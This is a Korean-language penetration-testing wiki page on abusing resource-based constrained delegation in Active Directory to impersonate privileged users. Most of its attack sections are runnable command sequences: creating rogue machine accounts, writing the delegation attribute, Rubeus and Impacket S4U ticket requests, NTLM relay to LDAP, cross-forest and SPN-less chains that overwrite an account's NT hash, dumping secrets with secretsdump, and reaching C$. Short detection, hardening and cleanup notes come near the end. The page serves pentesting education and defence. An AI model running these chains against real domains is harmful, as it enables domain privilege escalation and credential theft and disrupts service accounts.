# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation의 기본 사항

Resource-based constrained delegation (RBCD)은 [constrained delegation](constrained-delegation.md)과 비슷하지만, 신뢰 방향이 반대입니다. 기존 constrained delegation은 principal이 위임할 수 있는 서비스를 기록하지만, RBCD는 **대상 리소스**에 해당 리소스에서 어떤 principal이 사용자를 가장할 수 있는지 기록합니다.<sup>[[12]](#references)</sup>

대상 객체의 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 속성에는 해당 리소스에서 다른 identity를 대신해 동작할 수 있는 principal을 식별하는 보안 설명자가 포함됩니다.

또 다른 중요한 차이점은 **컴퓨터 계정에 대한 쓰기 권한**(`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` 및 유사한 권한)이 충분한 principal은 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 점입니다. 기존 constrained delegation을 구성하려면 일반적으로 더 높은 권한의 관리 액세스가 필요합니다.<sup>[[1]](#references)</sup>

더 정확히 말하면, 기존 constrained-delegation 설정을 변경하려면 일반적으로 도메인 컨트롤러에서 `SeEnableDelegationPrivilege`가 필요하며, 이 권한은 보통 고도의 권한을 가진 관리자에게만 있습니다. RBCD는 결정을 대상 객체의 보안 설명자에 맡기므로, 해당 사용자 권한이 없어도 관련 컴퓨터 객체 속성에 대한 쓰기 권한만으로 충분할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 새로운 개념

`userAccountControl`의 **`TrustedToAuthForDelegation`** 플래그는 **S4U2Self**의 전제 조건으로 흔히 설명되지만, 이는 불완전한 설명입니다.\
SPN이 있는 서비스 principal은 해당 플래그 없이도 S4U2Self를 요청할 수 있습니다. `TrustedToAuthForDelegation`이 설정되어 있으면 반환된 서비스 티켓은 **forwardable**이고, 설정되어 있지 않으면 일반적으로 **non-forwardable**입니다.<sup>[[5]](#references)</sup>

기존 constrained delegation은 S4U2Proxy 단계에서 **non-forwardable TGS**를 거부합니다. RBCD는 대상의 보안 설명자가 요청 서비스를 허용하는 경우 해당 S4U2Self 티켓을 받아들일 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 공격 구조

> **컴퓨터 계정**에 대해 **쓰기 권한과 동등한 권한**이 있다면 해당 머신에 대한 높은 권한의 액세스를 얻을 수 있습니다.

공격자가 이미 **피해 컴퓨터 객체에 대해 쓰기 권한과 동등한 권한**을 가지고 있다고 가정합니다.

1. 공격자는 **SPN**이 있는 계정을 **침해하거나 생성**합니다("Service A"). 기본적으로 인증된 도메인 사용자는 **_MachineAccountQuota_** 설정에 따라 최대 10개의 컴퓨터 객체를 생성할 수 있으며, 컴퓨터 객체에는 사용할 수 있는 SPN이 자동으로 부여됩니다.
2. 공격자는 피해 컴퓨터(ServiceB)에 대한 WRITE 권한을 **악용**해 ServiceA가 피해 컴퓨터(ServiceB)에 대해 모든 사용자를 가장하도록 **resource-based constrained delegation을 구성**합니다.
3. 공격자는 Rubeus를 사용해 Service A에서 Service B로 **전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행하며, **Service B에 대한 높은 권한의 액세스 권한이 있는 사용자**를 대상으로 합니다.
   1. S4U2Self(침해했거나 생성한 SPN 계정에서): Administrator를 나타내는 **Service A 대상 TGS**를 요청합니다(non-forwardable).
   2. S4U2Proxy: 해당 **non-forwardable TGS**를 사용해 **피해 호스트**를 대상으로 **Administrator**를 나타내는 서비스 티켓을 요청합니다.
   3. 대상 리소스의 보안 설명자에서 Service A를 허용하므로, 이 RBCD 흐름에서는 non-forwardable 티켓도 사용할 수 있습니다.
4. 공격자는 **pass-the-ticket**을 수행하고 사용자를 **가장**해 피해 ServiceB에 **액세스**할 수 있습니다.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0`으로 설정하면 기본적인 컴퓨터 생성 경로는 차단되지만, 대상 컴퓨터 객체에 대한 쓰기 권한이나 기존 계정의 제어 권한까지 없어지는 것은 아닙니다. SPN이 없는 일반 사용자를 제어하는 경우, 동일한 도메인 안에서도 [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd)를 통해 위임 principal로 사용할 수 있는 경우가 있습니다. 이 경로에도 유효한 RBCD 쓰기 권한, 위임 사용자의 자격 증명 제어, 위임 가능한 가장 대상 identity, 호환되는 Kerberos 암호화 동작, 그리고 계정에 영향을 주는 NT 해시 변경이 필요합니다. 이를 각각 별도의 전제 조건으로 취급해야 합니다. RBCD 속성이 비어 있거나 quota가 0이라는 사실만으로 성공이나 안전이 입증되지는 않습니다.

기존 RBCD 설명자에는 위임 컴퓨터를 직접 지정하는 대신 **그룹**을 지정할 수도 있습니다. SPN이 있는 컴퓨터 계정을 제어하고 해당 계정을 그 그룹에 추가할 수 있다면, 대상 컴퓨터의 RBCD 속성을 변경하지 않고도 새 멤버십으로 위임 경로를 확보할 수 있습니다. 이 경로가 작동하는지 판단하기 전에 그룹의 유효한 멤버십 쓰기 ACL(거부 ACE 포함), 중첩 멤버십과 토큰 새로 고침, 설명자의 trustee SID, 가장 대상 계정의 위임 제한, 대상 서비스 SPN을 확인하세요.

도메인의 _**MachineAccountQuota**_를 확인하려면 다음을 실행합니다:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## 공격

### 컴퓨터 개체 생성

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>를 사용해 도메인 내에 컴퓨터 개체를 생성할 수 있습니다.

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation 구성

**Active Directory PowerShell 모듈 사용**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview 사용**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Performing a complete S4U attack (Windows/Rubeus)

먼저 비밀번호 `123456`을 사용해 새 Computer 객체를 만들었으므로, 해당 비밀번호의 hash가 필요합니다:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

이렇게 하면 해당 계정의 RC4 및 AES 해시가 출력됩니다.\
이제 공격을 수행할 수 있습니다:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeus의 `/altservice` 매개변수를 사용하면 한 번만 요청해도 더 많은 서비스에 대한 티켓을 생성할 수 있습니다:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> 사용자는 **"계정이 중요하며 위임할 수 없습니다."**로 표시될 수 있습니다. 이 플래그가 활성화되면 이 위임 흐름을 통해 해당 계정을 가장할 수 없습니다. BloodHound는 분석 중 이 속성을 표시합니다.

### Linux 도구: Impacket를 사용한 전체 RBCD (2024+)

Linux에서 작업하는 경우, 공식 Impacket 도구를 사용해 전체 RBCD 체인을 수행할 수 있습니다.<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

노트
- LDAP signing/LDAPS가 적용된 경우 `impacket-rbcd -use-ldaps ...`를 사용하세요.
- AES 키를 우선 사용하세요. 최신 도메인에서는 RC4를 제한하는 경우가 많습니다. Impacket과 Rubeus는 모두 AES 전용 흐름을 지원합니다.
- 일부 도구에서 Impacket은 `sname`을 재작성("AnySPN")할 수 있지만, 가능하면 올바른 SPN을 구하세요(예: CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### SPN이 없는 Kerberos-only 위임자를 위한 Reflective RBCD

**`msDS-AllowedToDelegateTo`는 있지만 SPN이나 `TrustedToAuthForDelegation`은 없는** 침해된 사용자는 일반적인 S4U2Self로 [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation)에 필요한 forwardable evidence ticket을 생성할 수 없습니다.<sup>[[1]](#references)[[18]](#references)</sup> 해당 사용자가 자신의 **AD 객체**에 RBCD를 쓸 수 있다면, 공격자가 제어하는 SPN이 있는 계정이 먼저 *사용자에게* 위임할 수 있습니다.<sup>[[1]](#references)[[18]](#references)</sup> 이 RBCD 홉은 가장된 사용자의 forwardable ticket을 SPN이 없는 계정에 발급하며, 이 ticket은 침해된 계정의 클래식 위임 허용 목록에 있는 SPN으로 두 번째 S4U2Proxy를 수행할 때 evidence가 됩니다.<sup>[[18]](#references)[[19]](#references)</sup>

첫 번째 SPN 없는 홉에서는 helper 계정의 S4U2Proxy 요청에 **U2U**를 사용해야 합니다. `enc-tkt-in-skey`는 KDC가 SPN 키를 조회하는 대신 위임자의 TGT 세션 키로 ticket을 암호화하게 합니다.<sup>[[18]](#references)[[19]](#references)</sup> KDC에는 `PA-PAC-OPTIONS`의 RBCD 비트, 위임자의 TGT, 그리고 S4U2Self evidence ticket도 필요합니다.<sup>[[18]](#references)[[20]](#references)</sup> 작성자의 Impacket `getST.py` fork는 이 요청에 `-nospn`과 `-tgt`를 추가합니다. `-nospn`/`-tgt` 지원은 upstream Impacket PR #2324에 포함되어 있으므로, stock `getST.py`가 이 단계를 지원한다고 가정하지 말고 링크된 fork를 사용하세요.<sup>[[18]](#references)[[20]](#references)</sup>

이 예시에서는 `svc_web`이 침해되었고, 자체 RBCD attribute를 쓸 수 있으며, `host/dc01.corp.local`에 위임할 수 있다고 가정합니다. 또한 SPN이 있는 helper를 생성할 수 있고, RC4가 허용되며, 선택한 `Administrator`가 위임 가능하다고 가정합니다. 침해된 계정의 NT hash를 사용해 **RC4 TGT**를 요청하세요. 작성자의 fork에서 첫 번째 `getST.py`를 실행하고, `describeTicket.py` 출력을 확인한 다음 그 **RC4 TGT 세션 키**를 아래에 넣으세요. 마지막 `getST.py`는 stock Impacket을 사용할 수 있습니다. NT hash를 변경하기 **전에** TGT 요청을 수행하세요. 이 변경으로 서비스 계정은 비밀번호를 재설정할 때까지 중단됩니다.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

아래의 [SPN-less RBCD route](#spn-less-cross-domain--cross-forest-rbcd)와 달리, 이 체인에서는 SPN-less 계정을 **RBCD 대상이자 classic KCD 위임자**로 사용합니다. 여전히 SPN이 있는 다른 제어 계정이 필요합니다. `MachineAccountQuota=0`인 경우 새 컴퓨터 대신 이미 제어 중인 SPN 계정을 사용할 수 있으므로, quota가 0이라는 이유만으로 이 경로가 차단되지는 않습니다.<sup>[[18]](#references)[[19]](#references)</sup>

## Cross-domain & cross-forest RBCD

제어 중인 **위임 주체**가 **리소스 컴퓨터**와 **다른 도메인**(또는 **다른 포리스트**)에 있더라도 악용 기법은 여전히 **RBCD**입니다. 하지만 티켓 흐름은 일반적인 단일 도메인의 `S4U2Self -> S4U2Proxy`와 달라집니다.

### Cross-domain RBCD: 외부 주체를 SID로 설정

**다른 도메인**에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정하면, 대상 도메인의 LDAP에서 외부 컴퓨터/사용자를 **이름으로 확인하지 못할 수 있습니다**. 이 경우 해당 외부 주체의 sAMAccountName/UPN 대신 **SID**를 사용해 위임 항목을 설정합니다.

이는 `ntlmrelayx.py`를 사용해 NTLM을 LDAP로 릴레이할 때 특히 중요합니다:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

참고:
- `--sid`는 `ntlmrelayx.py`가 `--escalate-user`를 SID로 처리하도록 지정합니다. 위임 계정이 대상 도메인에 속하지 않는 경우 이 옵션이 필요합니다.
- 도구에서 `User not found in LDAP`가 출력되더라도 위임 설정은 성공할 수 있습니다. 보안 설명자에 외부 SID가 직접 저장되기 때문입니다.

### 도메인 간 RBCD: cross-realm S4U 시퀀스

외부 보안 주체가 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 추가되면, 다음과 같은 도메인 간 흐름이 가능합니다:<sup>[[9]](#references)[[13]](#references)</sup>

1. 위임 보안 주체의 자체 도메인에서 **TGT**를 가져옵니다.
2. `krbtgt/<target-domain>`에 대한 **referral TGT**를 요청합니다.
3. 대상 도메인 DC에서 가장할 사용자에 대한 **cross-realm S4U2Self referral**을 요청합니다.
4. 위임 도메인에서 해당 사용자에 대한 실제 **S4U2Self** 티켓을 요청합니다.
5. 위임 도메인에서 **S4U2Proxy**를 수행해 대상 도메인용 referral 티켓을 가져옵니다.
6. 대상 도메인 DC에서 마지막 **S4U2Proxy**를 수행해 `cifs/host.target`, `host/host.target` 등의 서비스 티켓을 가져옵니다.

이 때문에 기본 Linux 도구는 도메인 간 RBCD에서 실패하는 경우가 많습니다:<sup>[[9]](#references)</sup>
- 요청 **realm**이 `TGS-REQ`에서 사용하는 TGT의 realm과 달라야 할 수 있습니다.
- 체인에는 **독립적인 S4U2Proxy 단계**가 필요하며, `S4U2Self`만 수행하거나 `S4U2Self` 직후 단일 `S4U2Proxy`를 수행하는 것으로는 충분하지 않습니다.

### Linux에서 도메인 간 RBCD 수행하기

Synacktiv는 두 KDC를 명시적으로 처리해 Linux에서 cross-realm 시퀀스를 재현하는 Impacket `getST.py` 구현을 공개했습니다:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

운영상 새 인수는 다음과 같습니다.
- `-dc-ip`: **위임하는** 도메인의 DC
- `-targetdomain`: **리소스 컴퓨터**의 도메인
- `-targetdc`: **리소스** 도메인의 DC

### Cross-forest RBCD 제한 사항

Cross-forest RBCD에는 중요한 제한 사항이 있습니다. **가장하는 사용자는 위임 주체와 동일한 forest에 속해야 합니다**. 즉, 제어 중인 머신 계정이 `valhalla.local`에 있고 대상 리소스가 `asgard.local`에 있는 경우, 일반적으로 RBCD를 통해 해당 리소스에서 임의의 `asgard.local` 사용자를 가장할 수 **없습니다**.<sup>[[9]](#references)</sup>

다음의 경우에는 여전히 악용할 수 있습니다.
- **위임하는 forest**의 사용자가 다른 forest의 리소스 호스트에서 **로컬 관리자**(또는 그에 준하는 권한 사용자)인 경우
- trust에서 필요한 인증 경로를 허용하고, 대상 컴퓨터의 보안 설명자에서 외부 SID를 허용하는 경우

### Cross-forest RBCD 프로토콜의 특이 사항

Cross-forest RBCD는 단순히 "cross-domain에 trust를 더한 것"이 아닙니다. 관찰된 흐름에는 일반적인 도구가 과거에 놓쳤던 두 가지 특이 사항이 있습니다.<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`**를 설정하는 추가 **S4U2Proxy** 요청
2. 다른 etype을 요청했더라도 최종 service ticket이 **RC4**를 사용해 반환될 수 있음

실제 흐름은 다음과 같습니다.

1. forest A에서 위임 주체의 TGT를 가져옵니다.
2. forest A에서 가장할 사용자의 **S4U2Self**를 요청합니다.
3. forest A에서 **S4U2Proxy**를 요청해 forest B로 가는 referral TGT를 가져옵니다.
4. forest A에서 두 번째 **S4U2Proxy**를 보냅니다. 이때 S4U2Self 티켓을 additional ticket으로 포함하지 않고 `branch-aware`를 활성화해 forest B로 가는 또 다른 referral TGT를 가져옵니다.
5. 선택적으로 forest B에서 위임 주체의 일반 service ticket을 요청합니다(이 티켓은 최종 악용에 필요하지 않습니다).
6. 3단계와 4단계의 referral ticket을 사용해 forest B에서 가장할 forest A 사용자를 대상으로, 대상 SPN에 대한 최종 **S4U2Proxy** 티켓을 요청합니다.

### Linux에서의 Cross-forest RBCD

동일한 Synacktiv Impacket 브랜치에서는 이 로직에 `-forest` 스위치를 추가합니다.<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 재귀적 multi-domain RBCD (3개 이상 도메인)

**multi-domain forest**에서는 **S4U2Self**와 **S4U2Proxy** 모두 한 번의 referral 후에 멈추지 않고 **재귀적**으로 수행될 수 있습니다.

- **재귀적 S4U2Self**: 첫 번째 `S4U2Self` 요청은 **가장할 사용자의 도메인**으로 전송됩니다. 중간의 부모/자식 도메인 홉은 `krbtgt/<REALM>`에 대한 일반 `TGS-REQ` referral로 통과하며, **마지막 `S4U2Self`** 요청은 **위임 주체 자체의 도메인**으로 전송됩니다.
- 즉, **TGT만 보유하고 있어도** 같은 forest의 다른 도메인에 있는 **admin을 가장**하고 `cifs/host`, `host/host`, `wsman/host` 등을 요청할 수 있습니다.
- **재귀적 S4U2Proxy**도 같은 방식으로 trust chain을 따릅니다. 중간 홉에서는 다음 `krbtgt/<REALM>` referral을 요청할 때 이전 티켓을 TGT로 재사용하며, 마지막 홉에서만 최종 service ticket을 반환합니다.<sup>[[10]](#references)</sup>

실제 same-forest 예시는 다음과 같습니다.

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

**위임하는 principal이 SPN이 없는 사용자라면**, 마지막 재귀 `S4U2Self`가 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** 오류와 함께 실패합니다. 해결 방법은 **마지막 단계만 `S4U2Self+U2U`로 재시도하는 것**입니다.<sup>[[10]](#references)</sup>

악용 체인의 간략한 요약:

1. **NT hash**로 인증해 KDC가 **RC4-HMAC (etype 23)**을 사용하도록 유도합니다.
2. 먼저 **`-self -u2u`**를 요청하고, 이 ticket을 이후의 proxy 단계에서 사용할 ticket과 별도로 보관합니다.
3. `describeTicket.py`로 **TGT session key**를 추출합니다.
4. `changepasswd.py -newhashes <session_key>`를 사용해 사용자의 **NT hash**를 해당 **session key**로 교체합니다.
5. 별도의 **`-proxy`** 요청에서 `S4U2Self+U2U` ticket을 **`-additional-ticket`**으로 재사용합니다.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

운영상 유의 사항:

- **첫 번째 신뢰 홉이 이미 다른 포리스트인 경우**, Windows 기본 동작과 일치하도록 **branch-aware** 알고리즘(`getST.py ... -forest`)을 우선 사용하세요. 외부 포리스트에 체인 후반부에서만 도달하는 경우에는 branch-aware가 아닌 재귀 흐름도 작동할 수 있습니다.<sup>[[9]](#references)</sup>
- 최신 **Windows Server 2022/2025** DC에서는 RC4 지원 중단으로 인해 강제 RC4가 **`KDC_ERR_ETYPE_NOSUPP`** 오류와 함께 실패할 수 있습니다. 이 경우 기존 SPN 기반 RBCD는 AES로 작동하더라도 **SPN-less RBCD**는 불가능할 수 있습니다.<sup>[[15]](#references)</sup>
- 사용자의 해시/암호를 변경하기 전에 **`S4U2Self+U2U`를 실행하세요**. **`SamrChangePasswordUser`**는 계정의 Kerberos AES 키를 다시 계산하지 않으므로, 먼저 암호를 변경하면 이후 티켓 요청이 실패할 수 있습니다.<sup>[[14]](#references)</sup>
- 가장하는 계정은 여전히 **위임 가능**해야 합니다. **Protected Users** 및 **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"**가 설정된 계정은 체인을 차단합니다.

## 탐지 / 보안 강화 참고 사항

- 도메인/포리스트 간 RBCD 경로는 대개 **ACL 악용** 또는 **LDAP로의 relay**를 통해 만들어집니다. 일반적인 설정 경로를 차단하려면 DC에서 **LDAP signing**과 **LDAP channel binding**을 적용하세요.
- 컴퓨터 개체에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 쓸 수 있는 계정을 감사하고, **외부 보안 주체**를 포함해 저장된 SID를 확인하세요.
- 신뢰 관계가 많은 환경에서는 **Selective Authentication**, **SID filtering**, 그리고 외부 포리스트 사용자가 리소스 호스트에서 **local admin** 권한을 보유하고 있는지 검토하세요.

### 액세스

마지막 명령줄은 **전체 S4U 공격을 수행하고 Administrator의 TGS를 피해자 호스트의 메모리에 주입**합니다.\
이 예에서는 Administrator의 **CIFS** 서비스용 TGS를 요청했으므로 **C$**에 액세스할 수 있습니다:

```bash
ls \\victim.domain.local\C$
```

### 서로 다른 서비스 티켓 악용

[**사용 가능한 서비스 티켓은 여기에서 확인**](silver-ticket.md#available-services)하세요.

## 열거, 감사 및 정리

### RBCD가 구성된 컴퓨터 열거

PowerShell (SD를 디코딩하여 SID 확인):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (한 명령으로 읽거나 플러시):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCD 정리 / 초기화

- PowerShell (속성 지우기):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos 오류

- **`KDC_ERR_ETYPE_NOTSUPP`**: Kerberos가 DES 또는 RC4를 사용하지 않도록 구성되어 있는데 RC4 해시만 제공했다는 뜻입니다. Rubeus에 최소한 AES256 해시를 제공하거나(또는 rc4, aes128, aes256 해시를 모두 제공하세요). 예: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 일반 사용자에 대해 `-self`를 수행할 때 발생하는 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: 위임하는 principal에 **SPN이 없을 가능성이 높습니다**. 일반적인 `S4U2Self` 대신 **`S4U2Self+U2U`**를 사용해 **마지막 hop**을 다시 시도하세요.<sup>[[10]](#references)</sup>
- **SPN이 없는 RBCD** 중 발생하는 **`KDC_ERR_ETYPE_NOSUPP`**: 최신 DC에서는 `S4U2Self+U2U`와 세션 키 대체 기법에 필요한 강제 **RC4-HMAC** 경로를 거부할 수 있습니다. 대신 AES를 사용하는 기존 **SPN 기반** RBCD 경로를 시도하세요.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: 현재 컴퓨터와 DC의 시간이 달라 Kerberos가 제대로 작동하지 않는다는 뜻입니다.
- **`preauth_failed`**: 제공한 사용자 이름과 해시로 로그인할 수 없다는 뜻입니다. 해시를 생성할 때 사용자 이름에 "$"를 넣지 않았을 수 있습니다(`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- S4U2Proxy 중 발생하는 **`KDC_ERR_BADOPTION`**: 가장 대상 계정의 위임 제한, evidence ticket의 forwardable 플래그, 그리고 classic KCD 또는 대상의 RBCD descriptor가 이 hop을 허용하는지 확인하세요. 이는 **KDC 위임 정책 오류**이며, 대상 서비스가 실행 중인지 또는 사용자에게 애플리케이션 수준의 액세스 권한이 있는지를 확인하는 오류가 아닙니다. 등록되지 않은 대상 SPN에서는 일반적으로 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**이 발생합니다.<sup>[[21]](#references)[[22]](#references)</sup>

## 참고 사항, 릴레이 및 대안

- LDAP가 필터링된 경우 AD Web Services(ADWS)를 통해 RBCD SD를 쓸 수도 있습니다. 다음을 참고하세요:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay 체인은 한 단계로 로컬 SYSTEM을 획득하기 위해 RBCD로 끝나는 경우가 많습니다. 실제 end-to-end 예시는 다음을 참고하세요:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding이 **비활성화**되어 있고 machine account를 만들 수 있다면, **KrbRelayUp** 같은 도구를 사용해 강제로 유도한 Kerberos 인증을 LDAP로 릴레이하고, 대상 컴퓨터 객체에서 machine account에 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정한 다음, 호스트 외부에서 S4U를 통해 즉시 **Administrator**를 가장할 수 있습니다.<sup>[[8]](#references)</sup>

## References

- [1] [개를 흔들다: Resource-Based Constrained Delegation을 악용해 Active Directory 공격하기](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [위임에 관한 또 다른 이야기 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
